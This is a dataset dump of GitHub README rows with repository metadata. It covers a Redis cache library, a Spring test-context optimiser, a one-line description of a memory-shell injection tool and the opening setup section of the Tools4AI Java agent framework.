        cacheTemplate.getObject(key);
        cacheTemplate.getLong(key);
        cacheTemplate.getDouble(key);
        // incr
        cacheTemplate.incr(key);
        // set get bit
        cacheTemplate.setBit(key, 7, true);
        cacheTemplate.getBit(key, 7);
        // del exists expire ttl unlink
        cacheTemplate.del(key);
        cacheTemplate.exists(key);
        cacheTemplate.expire(key, 10, TimeUnit.SECONDS);
        cacheTemplate.expireAt(key, System.currentTimeMillis());
        cacheTemplate.ttl(key);
        cacheTemplate.unlink(key);
        // geo
        cacheTemplate.geoAdd(key, 13.361389, 38.115556, ""Sicily"");
        cacheTemplate.geoAdd(key, 15.087269, 37.502669, ""Palermo"");
        cacheTemplate.geoDist(key, ""Sicily"", ""Palermo"", ""km"");
        // hash
        cacheTemplate.hSet(key, ""field1"", value);
        cacheTemplate.hGet(key, ""field1"");
        // hyberloglog
        cacheTemplate.pfAdd(key, Arrays.asList(""a""));
        cacheTemplate.pfCount(key);
        // list
        cacheTemplate.rPush(key, ""world"", ""hello"");
        cacheTemplate.lRange(key, 0, -1);
        // set
        cacheTemplate.sAdd(key, ""hello"");
        cacheTemplate.sAdd(key, ""world"");
        cacheTemplate.sAdd(key, ""world"");
        cacheTemplate.sMembers(key);
        // zset
        cacheTemplate.zAdd(key, 1, ""one"");
        cacheTemplate.zAdd(key, 2, ""two"");
        cacheTemplate.zAdd(key, 3, ""three"");
        cacheTemplate.zRange(key, 0, -1);
        // bloom filter
        cacheTemplate.bfReserve(key, 1000, 0.01);
        cacheTemplate.bfAdd(key, ""item1"");
        cacheTemplate.bfAdd(key, ""item1"");
        cacheTemplate.bfExists(key, ""item2"");
        // lock
        cacheTemplate.tryLock(key, 3, TimeUnit.SECONDS);
        cacheTemplate.unlock(key);
        cacheTemplate.forceUnlock(key);
        // rate limiter
        cacheTemplate.trySetRateLimiter(key, 100, 1);
        cacheTemplate.tryAcquire(key);
        cacheTemplate.tryAcquire(key, 10);
        // pipeline execute
        cacheTemplate.pipeline(kBatch -> {
            kBatch.getString().setAsync(key, ""bar"");
            kBatch.getGeo().geoAddAsync(key, 13.361389, 38.115556, ""Sicily"");
            kBatch.getList().llenAsync(key);
        });
        // pipeline execute and get response
        final List<?> responses = cacheTemplate.pipelineWithResponses(kBatch -> {
            kBatch.getString().setAsync(key, ""bar"");
            kBatch.getGeo().geoAddAsync(key, 13.361389, 38.115556, ""Sicily"");
            kBatch.getList().llenAsync(key);
        });
        // pipeline execute async
        final CompletableFuture<Void> voidCompletableFuture = cacheTemplate.pipelineAsync(kBatch -> {
            kBatch.getString().setAsync(key, ""bar"");
            kBatch.getGeo().geoAddAsync(key, 13.361389, 38.115556, ""Sicily"");
            kBatch.getList().llenAsync(key);
        });
        // pipeline execute and get response async
        final CompletableFuture<List<?>> listCompletableFuture = cacheTemplate.pipelineWithResponsesAsync(kBatch -> {
            kBatch.getString().setAsync(key, ""bar"");
            kBatch.getGeo().geoAddAsync(key, 13.361389, 38.115556, ""Sicily"");
            kBatch.getList().llenAsync(key);
        });
    }

}

```

## Unlimited Expansion

#### CacheTemplate adds new custom methods

1. Maven

```java
<dependency>
	<groupId>org.codeba</groupId>
	<artifactId>redis-keeper-spring-boot-starter</artifactId>
	<version>2024.2.0</version>
</dependency>
```

2. CacheTemplate adds new custom methods

MyCacheTemplate.java

```java
import org.codeba.redis.keeper.support.CacheKeeperConfig;
import org.codeba.redis.keeper.support.DefaultRedissonTemplate;

public class MyCacheTemplate extends DefaultRedissonTemplate implements CacheTemplate {

    public MyCacheTemplate(CacheKeeperConfig cacheKeeperConfig) {
        super(cacheKeeperConfig);
    }

    public void test() {
	    final RedissonClient redissonClient = getDataSource();
        redissonClient.someMehotd();
        System.out.println(""hello world"");
    }

}
```

MyCacheDatasource.java

```java
import org.codeba.redis.keeper.support.CacheDatasource;
import org.codeba.redis.keeper.support.CacheKeeperConfig;

public class MyCacheDatasource implements CacheDatasource<MyCacheTemplate> {

    @Override
    public MyCacheTemplate instantTemplate(CacheKeeperConfig config) {
        return new MyCacheTemplate(config);
    }

}
```

Enabling the new MyCacheDatasource

```java
import org.codeba.redis.keeper.support.CacheDatasource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MyConfiguration {

    @Bean
    public CacheDatasource<MyCacheTemplate> cacheDatasource() {
        return new MyCacheDatasource();
    }

}
```

3. Enabling the new CacheTemplate

```java
@SpringBootTest
public class AppTest {

    @Autowired
    private CacheTemplateProvider<MyCacheTemplate> myProvider;

    @Test
    public void testMyProvider() {
        final Optional<MyCacheTemplate> templateOptional = myProvider.getTemplate(""ds1"");

        if (templateOptional.isPresent()) {
            final MyCacheTemplate cacheTemplate = templateOptional.get();

            // Custom Methods
            cacheTemplate.test();

        }
    }

}
```

#### CacheDatasource custom redisson configuration

1. Maven

```java
<dependency>
	<groupId>org.codeba</groupId>
	<artifactId>redis-keeper-spring-boot-starter</artifactId>
	<version>2024.2.0</version>
</dependency>
```

2. For example, custom setting the encoding of redisson serialization and deserialization while enabling the new CacheDatasource.

```java
import org.codeba.redis.keeper.support.CacheDatasource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MyConfiguration {

    @Bean
    public CacheDatasource<CacheTemplate> cacheDatasource() {
        return new DefaultCacheDatasource(){
            @Override
            public Consumer<CacheKeeperConfig> configPostProcessor(Consumer<CacheKeeperConfig> consumer) {
                return v -> v.getConfig().setCodec(new JsonJacksonCodec());
            }
        };
    }

}
```

## More Samples

1. [Redis-Keeper only](https://github.com/codebaorg/redis-keeper/tree/main/redis-keeper-example/redis-keeper-example-standalone)
2. [Redis-Keeper with Spring boot](https://github.com/codebaorg/redis-keeper/tree/main/redis-keeper-example/redis-keeper-example-springboot)
3. [Redis-Keeper with Spring cloud](https://github.com/codebaorg/redis-keeper/tree/main/redis-keeper-example/redis-keeper-example-springcloud)


## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=codebaorg/redis-keeper&type=Date)](https://star-history.com/#codebaorg/redis-keeper&Date)

",2,0,2,apache-2.0,0.0,"['redis', 'keeper', 'lightweight', 'redis', 'management', 'tool', 'supported', 'jdk', 'supported', 'redisson', 'supported', 'redis', 'feature', 'based', 'redisson', 'package', 'retain', 'powerful', 'feature', 'redisson', 'support', 'multiple', 'data', 'source', 'configuration', 'update', 'redis', 'support', 'skip', 'state', 'switching', 'redis', 'data', 'source', 'excellent', 'expandability', 'compatibility', 'meet', 'need', 'quick', 'start', 'maven', 'gradle', 'sbt', 'java', 'springboot', 'maven', 'example', 'datasource', 'configuration', 'example', 'common', 'unlimited', 'expansion', 'cachetemplate', 'add', 'new', 'custom', 'method', 'maven', 'cachetemplate', 'add', 'new', 'custom', 'method', 'enabling', 'new', 'mycachedatasource', 'enabling', 'new', 'cachetemplate', 'cachedatasource', 'custom', 'redisson', 'configuration', 'maven', 'example', 'custom', 'setting', 'encoding', 'redisson', 'serialization', 'deserialization', 'enabling', 'new', 'cachedatasource', 'sample', 'spring', 'boot', 'spring', 'cloud', 'star', 'history']","['redis', 'redisson', 'new', 'maven', 'custom']",9,1,0,"['redis', 'keeper', 'lightweight', 'redis', 'management', 'tool', 'feature', 'quick', 'start', 'maven', 'gradle', 'sbt', 'java', 'springboot', 'unlimited', 'expansion', 'cachetemplate', 'add', 'new', 'custom', 'method', 'cachedatasource', 'custom', 'redisson', 'configuration', 'more', 'sample', 'star', 'history']",13,"['redis', 'custom', 'keeper', 'lightweight', 'management']",14,10.0,10.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,8.0,2.0,11141,56.85,6.673702726473175,"['![Maven Central -> https://maven-badges.herokuapp.com/maven-central/org.redisson/redisson/badge.svg', '![License -> http://img.shields.io/:license-apache-brightgreen.svg', 'Redis-Keeper only -> https://github.com/codebaorg/redis-keeper/tree/main/redis-keeper-example/redis-keeper-example-standalone', 'Redis-Keeper with Spring boot -> https://github.com/codebaorg/redis-keeper/tree/main/redis-keeper-example/redis-keeper-example-springboot', 'Redis-Keeper with Spring cloud -> https://github.com/codebaorg/redis-keeper/tree/main/redis-keeper-example/redis-keeper-example-springcloud', '![Star History Chart -> https://api.star-history.com/svg?repos=codebaorg/redis-keeper&type=Date']",6
seregamorph/spring-test-smart-context,master,"## Improving Spring Boot Test efficiency

### Problem statement
Spring test framework creates an application context according to test class configuration.
The context is cached and reused for all subsequent tests. If there is an existing context
with the same configuration, it will be reused. Otherwise, the new context will be created.
This is a very efficient and flexible approach, but it has a drawback: eventually this may
lead to out of memory errors if the number of unique configurations is too high and context
has a lot of heavyweight beans like TestContainers. In many cases simple static bean 
definition can help, but this project suggests another approach: reordering test classes
and eager context cleanup.

Consider a sample test suite of 8 classes that use 4 different configurations, classes that have the same configuration
are marked with the same colour:

<img src=""doc/sample-test-suite.png"" alt=""Sample test suite"" width=""700""/>

In a large test suites as well as in shared CI/CD environments with lots of test pipelines
working simultaneously this may eventually lead to out of memory errors
in Java process or Docker host.

### Proposed solution
It's recommended to use statically-defined TestContainers beans, optimize reusing same configuration between tests 
e.g. via common test super-classes.
But additionally this library makes two optimizations:
* test class execution is reordered to group tests with the same context configuration so they
can be executed sequentially
* the order of tests is known, so if current test class is last per current configuration, the spring context
will be automatically closed (it's called `Smart DirtiesContext`) and the beans will be disposed releasing resources

As a result, in a suite of single module there will always be not more than 1 active spring contexts:

<img src=""doc/reorder-and-smart-dirties-context.png"" alt=""Reordered suite with smart DirtiesContext"" width=""700""/>

This chart is done via calculating the number of active docker containers while executing a suite of 120 integration
test classes that actively uses TestContainers for databases (several datasources simultaneously) and other services:

<img src=""doc/active-docker-containers.png"" alt=""Number of active docker containers"" width=""700""/>

As shown on the chart, the suite just fails with OOM without the optimization.
As an advantage, the total test execution time will also become less, because resource consumption (especially memory)
will be reduced, hence tests are executed faster.

### References
This idea was submitted to the Spring Framework team as a feature request:
* https://github.com/spring-projects/spring-framework/issues/32289

Public presentation with AtomicJar (TestContainers creators):
* https://www.youtube.com/watch?v=_Vci_5nr8R0

### Limitations
At the moment only single thread test execution per module is supported. Parallel test execution is work in progress.
Also there can be problems with Jupiter
[Nested](https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested) test classes.

### Supported versions
`Java` 8+ (`Java` 17+ for spring-boot 3.x projects)

`Spring Boot` 2.4+, 3.x as well as bare Spring framework

Supported test frameworks:
* `JUnit 4` (via JUnit 5 [junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running))
* `JUnit 5 Jupiter`
* `TestNG` (both bare TestNG and JUnit platform [testng-engine](https://github.com/junit-team/testng-engine))

`Gradle Enterprise Maven Extension` (test execution caching) correctly supports changed behaviour

### How to use
Add maven dependency (available in maven central):
```xml
<dependency>
    <groupId>com.github.seregamorph</groupId>
    <artifactId>spring-test-smart-context</artifactId>
    <version>0.3</version>
    <scope>test</scope>
</dependency>
```
Or Gradle dependency:
```groovy
testImplementation(""com.github.seregamorph:spring-test-smart-context:0.3"")
```
It's recommended to check [Demo projects](demo).

### How it works

<details>
  <summary>JUnit 5 Jupiter</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesClassOrderer](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/SmartDirtiesClassOrderer.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnitSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/AbstractJUnitSpringIntegrationTest.java)
</details>

<details>
  <summary>TestNG</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesSuiteListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/SmartDirtiesSuiteListener.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
The integration test classes should add
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
Note: the annotation is inherited, so it makes sense to annotate the base test class or use
[AbstractTestNGSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/AbstractTestNGSpringIntegrationTest.java)
parent.
</details>

<details>
  <summary>JUnit 4</summary>

Note: support of JUnit 4 is planned to be removed in version 1.0 (will stay available in 0.x versions).

The JUnit 4 does not provide standard way to reorder test class execution, but it's still possible via
[junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running).
This dependency should be added to test scope of the module:
```xml
<dependency>
    <groupId>org.junit.vintage</groupId>
    <artifactId>junit-vintage-engine</artifactId>
    <scope>test</scope>
</dependency>
```
or for Gradle (see [detailed instruction](https://docs.gradle.org/current/userguide/java_testing.html#executing_legacy_tests_with_junit_vintage)):
```groovy
testRuntimeOnly('org.junit.vintage:junit-vintage-engine')
testRuntimeOnly('org.junit.platform:junit-platform-launcher')
```
Also the `surefire`/`failsafe` plugins should be configured to use junit-platform:
```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-failsafe-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
```
or for Gradle:
```groovy
tasks.named('test', Test) {
    useJUnitPlatform()
}
```

For projects with JUnit 4 it will automatically setup
[SmartDirtiesPostDiscoveryFilter](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesPostDiscoveryFilter.java)
which will reorder test classes on the level of junit-launcher and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnit4SpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/junit4/AbstractJUnit4SpringIntegrationTest.java)
</details>

### Additional materials
* See the online presentation of the project https://www.youtube.com/watch?v=_Vci_5nr8R0 hosted by 
[AtomicJar](https://www.atomicjar.com/), the creators of [TestContainers](https://testcontainers.com/) framework.
* Presentation slides: [Miro board](https://miro.com/app/board/uXjVN3KJeCI=/?share_link_id=309027962805)

### Known projects using library
<img src=""doc/miro-logo.png"" alt=""Miro"" width=""120""/>

[Miro](https://miro.com/) is using this approach to optimize huge integration test suites and it saved a lot of resource
for CI/CD pipelines.
",3,0,3,apache-2.0,6.0,"['improving', 'spring', 'boot', 'test', 'efficiency', 'problem', 'statement', 'spring', 'test', 'framework', 'creates', 'application', 'context', 'according', 'test', 'class', 'configuration', 'context', 'cached', 'reused', 'subsequent', 'test', 'existing', 'context', 'configuration', 'reused', 'otherwise', 'new', 'context', 'created', 'efficient', 'flexible', 'approach', 'drawback', 'eventually', 'may', 'lead', 'memory', 'error', 'number', 'unique', 'configuration', 'high', 'context', 'lot', 'heavyweight', 'bean', 'like', 'testcontainers', 'many', 'case', 'simple', 'static', 'bean', 'definition', 'help', 'project', 'suggests', 'another', 'approach', 'reordering', 'test', 'class', 'eager', 'context', 'cleanup', 'consider', 'sample', 'test', 'suite', 'class', 'use', 'different', 'configuration', 'class', 'configuration', 'marked', 'colour', 'large', 'test', 'suite', 'well', 'shared', 'environment', 'lot', 'test', 'pipeline', 'working', 'simultaneously', 'may', 'eventually', 'lead', 'memory', 'error', 'java', 'process', 'docker', 'host', 'proposed', 'solution', 'recommended', 'use', 'testcontainers', 'bean', 'optimize', 'reusing', 'configuration', 'test', 'via', 'common', 'test', 'additionally', 'library', 'make', 'two', 'optimization', 'test', 'class', 'execution', 'reordered', 'group', 'test', 'context', 'configuration', 'executed', 'sequentially', 'order', 'test', 'known', 'current', 'test', 'class', 'last', 'per', 'current', 'configuration', 'spring', 'context', 'automatically', 'closed', 'called', 'bean', 'disposed', 'releasing', 'resource', 'result', 'suite', 'single', 'module', 'always', 'active', 'spring', 'context', 'chart', 'done', 'via', 'calculating', 'number', 'active', 'docker', 'container', 'executing', 'suite', 'integration', 'test', 'class', 'actively', 'us', 'testcontainers', 'database', 'several', 'datasources', 'simultaneously', 'service', 'shown', 'chart', 'suite', 'fails', 'oom', 'without', 'optimization', 'advantage', 'total', 'test', 'execution', 'time', 'also', 'become', 'less', 'resource', 'consumption', 'especially', 'memory', 'reduced', 'hence', 'test', 'executed', 'faster', 'references', 'idea', 'submitted', 'spring', 'framework', 'team', 'feature', 'request', 'http', 'public', 'presentation', 'atomicjar', 'testcontainers', 'creator', 'http', 'limitation', 'moment', 'single', 'thread', 'test', 'execution', 'per', 'module', 'supported', 'parallel', 'test', 'execution', 'work', 'progress', 'also', 'problem', 'jupiter', 'nested', 'test', 'class', 'supported', 'version', 'project', 'well', 'bare', 'spring', 'framework', 'supported', 'test', 'framework', 'via', 'junit', 'bare', 'testng', 'junit', 'platform', 'test', 'execution', 'caching', 'correctly', 'support', 'changed', 'behaviour', 'use', 'add', 'maven', 'dependency', 'available', 'maven', 'central', 'gradle', 'dependency', 'recommended', 'check', 'demo', 'project', 'work', 'add', 'dependency', 'library', 'test', 'scope', 'automatically', 'setup', 'smartdirtiesclassorderer', 'reorder', 'test', 'class', 'execution', 'prepare', 'list', 'last', 'test', 'class', 'per', 'context', 'configuration', 'test', 'execution', 'listener', 'smartdirtiescontexttestexecutionlistener', 'via', 'alternatively', 'defined', 'explicitly', 'even', 'inherited', 'abstractjunitspringintegrationtest', 'add', 'dependency', 'library', 'test', 'scope', 'automatically', 'setup', 'smartdirtiessuitelistener', 'reorder', 'test', 'class', 'execution', 'prepare', 'list', 'last', 'test', 'class', 'per', 'context', 'configuration', 'integration', 'test', 'class', 'add', 'smartdirtiescontexttestexecutionlistener', 'note', 'annotation', 'inherited', 'make', 'sense', 'annotate', 'base', 'test', 'class', 'use', 'abstracttestngspringintegrationtest', 'parent', 'note', 'support', 'junit', 'planned', 'removed', 'version', 'stay', 'available', 'version', 'junit', 'provide', 'standard', 'way', 'reorder', 'test', 'class', 'execution', 'still', 'possible', 'via', 'dependency', 'added', 'test', 'scope', 'module', 'gradle', 'see', 'detailed', 'instruction', 'also', 'plugins', 'configured', 'use', 'gradle', 'project', 'junit', 'automatically', 'setup', 'smartdirtiespostdiscoveryfilter', 'reorder', 'test', 'class', 'level', 'prepare', 'list', 'last', 'test', 'class', 'per', 'context', 'configuration', 'test', 'execution', 'listener', 'smartdirtiescontexttestexecutionlistener', 'via', 'alternatively', 'defined', 'explicitly', 'even', 'inherited', 'additional', 'material', 'see', 'online', 'presentation', 'project', 'http', 'hosted', 'atomicjar', 'creator', 'testcontainers', 'framework', 'presentation', 'slide', 'miro', 'board', 'known', 'project', 'using', 'library', 'miro', 'using', 'approach', 'optimize', 'huge', 'integration', 'test', 'suite', 'saved', 'lot', 'resource', 'pipeline']","['test', 'class', 'context', 'configuration', 'execution']",0,3,0,"['improve', 'spring', 'boot', 'test', 'efficiency', 'problem', 'statement', 'propose', 'solution', 'reference', 'limitation', 'support', 'version', 'how', 'use', 'how', 'work', 'additional', 'material', 'know', 'project', 'use', 'library']",10,"['how', 'use', 'improve', 'spring', 'boot']",9,32.0,8.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:versions-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,6.0,2.0,9459,49.76,6.016077170418006,"['Nested -> https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested', 'junit-vintage-engine -> https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running', 'testng-engine -> https://github.com/junit-team/testng-engine', 'junit-vintage-engine -> https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running', 'detailed instruction -> https://docs.gradle.org/current/userguide/java_testing.html#executing_legacy_tests_with_junit_vintage', 'AtomicJar -> https://www.atomicjar.com/', 'TestContainers -> https://testcontainers.com/', 'Miro board -> https://miro.com/app/board/uXjVN3KJeCI=/?share_link_id=309027962805', 'Miro -> https://miro.com/']",9
W01fh4cker/MemshellKit,main,"# MemshellKit
针对多个框架的内存马一键打入工具 | A powerful tool for injecting memory shells for multiple frameworks.
",0,0,1,mit,0.0,"['memshellkit', 'powerful', 'tool', 'injecting', 'memory', 'shell', 'multiple', 'framework']","['memshellkit', 'powerful', 'tool', 'injecting', 'memory']",0,0,0,['memshellkit'],1,['memshellkit'],0,0.0,1.0,[],0.0,1.0,0.0,102,12.0,7.083333333333333,[],0
vishalmysore/Tools4AI,main,"<div align=""center"">
  <a href=""https://www.linkedin.com/posts/vishalrow_ai-appdevelopment-actions-activity-7171302152101900288-64qg?utm_source=share&utm_medium=member_desktop"">
    <img src=""tools4ai.png""  width=""200"" height=""200"">
  </a>
</div>
<p align=""center"">
    <img  src=""https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fvishalmysore%2Ftools4ai&countColor=black&style=flat%22"">
    <a target=""_blank"" href=""https://github.com/vishalmyore/tools4ai""><img src=""https://img.shields.io/github/stars/vishalmysore/tools4ai?color=black"" /></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=alert_status""/></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=bugs""/></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=vulnerabilities""/></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=sqale_rating""/></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=security_rating""/></a>
    <a target=""_blank"" href=""https://sonarcloud.io/summary/new_code?id=vishalmysore_Tools4AI""><img src=""https://sonarcloud.io/api/project_badges/measure?project=vishalmysore_Tools4AI&metric=reliability_rating""/></a>
    <a target=""_blank"" href=""https://github.com/vishalmysore/Tools4AI/actions/workflows/maven.yml""><img src=""https://github.com/vishalmysore/Tools4AI/actions/workflows/maven.yml/badge.svg""/></a>
    <a target=""_blank"" href=""https://github.com/vishalmysore/Tools4AI/actions/workflows/qodana_code_quality.yml""> <img src=""https://github.com/vishalmysore/Tools4AI/actions/workflows/qodana_code_quality.yml/badge.svg""/></a>
    <a target=""_blank"" href=""https://github.com/vishalmysore/Tools4AI/actions/workflows/codecov.yml""> <img src=""https://github.com/vishalmysore/Tools4AI/actions/workflows/codecov.yml/badge.svg""/></a>
    <a href=""https://codecov.io/gh/vishalmysore/Tools4AI"" > <img src=""https://codecov.io/gh/vishalmysore/Tools4AI/graph/badge.svg?token=9KLDLKUBW1""/> </a>
    <a href=""https://snyk.io/test/github/vishalmysore/tools4ai""><img src=""https://snyk.io/test/github/vishalmysore/tools4ai/badge.svg""/> </a>
    <a href=""https://central.sonatype.com/artifact/io.github.vishalmysore/tools4ai""> <img alt=""Maven Central Version"" src=""https://img.shields.io/maven-central/v/io.github.vishalmysore/tools4ai""></a>
    <img alt=""Test Number"" src=""https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/vishalmysore/edaa1463cc6a52c8dc82fc98017f5d2f/raw/test.json""/>
</p>





### Table of Contents
- [Rapid Start](#-Rapid-Start)
- [Tools4AI](#-Tools4AI)
- [SetUp](#setup)  
  - [Gemini](#gemini)
  - [OpenAI](#OpenAi)
  - [Anthropic](#anthropic)  
- [Reference Examples](#%EF%B8%8F-reference-examples)  
  - [Java Actions](#java-actions)
  - [HTTP REST Actions](#http-actions-swagger)
  - [Shell Actions](#shell-actions)
  - [Custom HTTP Actions](#custom-http-actions)
  - [Selenium Integration](#selenium-integration)
  - [Image Actions](#image-actions)
  - [Automated UI validation](#automated-ui-validations)
  - [Spring Integration](#spring-integration)
  - [JavaDocs](#-javadocs)
- [Prediction Loaders](#-prediction-loaders)  
  - [Java Prediction Loader](#-java-prediction-loaders)
  - [Swagger Prediction Loader](#%EF%B8%8F-swagger-prediction-loader)
  - [Shell Prediction Loader](#%EF%B8%8F-shell-prediction-loader)
  - [Extended Prediction Loader](#%EF%B8%8F-extended-prediction-loader)  
- [Response Validation](#response-validation)
  - [Hallucination](#hallucination)   
- [Autonomous Agent](#autonomous-agent)  
  - [Action Scripts](#action-script)


# 📌 Rapid Start
🧱 Do you want to start building ASAP , Look at Rapid start here https://github.com/vishalmysore/simplelam  

🌱 Integration of Spring Controller and AI Actions - https://github.com/vishalmysore/SpringActions  

👉 Live Demo - https://huggingface.co/spaces/VishalMysore/EnterpriseAIHub


# 💡 Tools4AI
Tools4AI is 100% Java based Agentic Framework which can be used to build Java based AI agents for integration with enterprise 
Java applications.
This project illustrates the integration of AI with enterprise tools or external tools, converting natural language prompts
into <span style=""font-size: larger;"">**actiona ble behaviors**.</span> These prompts can be called <span style=""font-size: larger;"">**""action prompts""**</span>
or <span style=""font-size: larger;"">**""actionable prompts""**</span>  By leveraging AI capabilities, it streamlines user interactions
with complex systems, enhancing productivity and innovation across diverse applications.<br>

For example , we can integrate AI with a customer service application. Users can interact with the AI system by asking<br> 
questions or making requests in natural language. For example, a user might ask,**""Schedule a maintenance <br>
appointment for my car.""** The AI system interprets the request, extracts relevant information such as the <br>
service required and preferred date, and then triggers the appropriate action in the customer service<br>
application to schedule the appointment. This seamless integration streamlines the process for users and<br>
enhances the efficiency of the customer service workflow.
<br>
| Prompt                                                                                                              | Action                                                                                                                                                |
|---------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
| Create a <span style=""color:blue"">**new task**</span> for the marketing campaign.                                                                                                     | The AI system interprets the request and generates a new task entry within the project management tool dedicated to the marketing campaign, assigning it relevant details such as priority level, due date, and task description. |
| Generate a <span style=""color:blue"">**sales report**</span> for the previous <span style=""color:blue"">**quarter**</span>.                                                                 | The AI system accesses data from the company's sales database, analyzes the information for the previous quarter, and generates a comprehensive sales report, which is then delivered to the user or stored in the appropriate location for access. |
| Check the <span style=""color:blue"">**inventory status**</span> of <span style=""color:blue"">**product X.**</span>                                                                           | The AI system retrieves real-time inventory data for product X from the inventory management system and provides the user with information regarding current stock levels, including quantities available, locations, and any pending orders. |
| Schedule a <span style=""color:blue"">**video conference**</span> with the engineering team for next Monday at 10 AM.                                      | The AI system interfaces with the calendar and scheduling tool, creates a new event titled ""Engineering Team Video Conference"" for the specified date and time, and sends out meeting invitations to all members of the engineering team. |
| Submit a reimbursement request for the <span style=""color:blue"">**business**</span> trip <span style=""color:blue"">**expenses.**</span>                                                     | The AI system guides the user through the reimbursement request process, collecting necessary details such as expense receipts, dates, amounts, and purpose of expenditure. Once compiled, the system submits the reimbursement request to the appropriate department for processing. |



Prompt prediction is a technique used to anticipate user actions based on their input prompts. For instance,
if a user's prompt is ""my car broke down,"" in addition to the action ""bookTaxi,"" the AI system can predict a
set of subsequent actions such as ""bookCarService"" and ""orderFood"" (if it's dinner time). This predictive
capability enhances the user experience by proactively suggesting relevant actions or services based on the
context provided in the prompt.

# SetUp

Download source and build from scratch

```mvn clean install``` <br>

if you are using Intellij or eclipse make sure you set -parameters option for compiler

Or use as maven dependency 
```
<dependency>
    <groupId>io.github.vishalmysore</groupId>
    <artifactId>tools4ai</artifactId>
    <version>0.9.6</version>
</dependency>

```
check for latest version here  https://repo1.maven.org/maven2/io/github/vishalmysore/tools4ai/

## Gemini
Make sure you have gcloud project set up and have enabled vertex API
```     
        String projectId = ""cookgptserver"" // this can be any server name you create in your GCloud
        String location = ""us-central1"";
        String modelName = ""gemini-1.0-pro"";
```
You have to mention your project id from Gcloud 

## OpenAI

If you plan to use OpenAI instead of Gemini you will need OpenAI api key
Instructions here https://help.openai.com/en/articles/4936850-where-do-i-find-my-openai-api-key

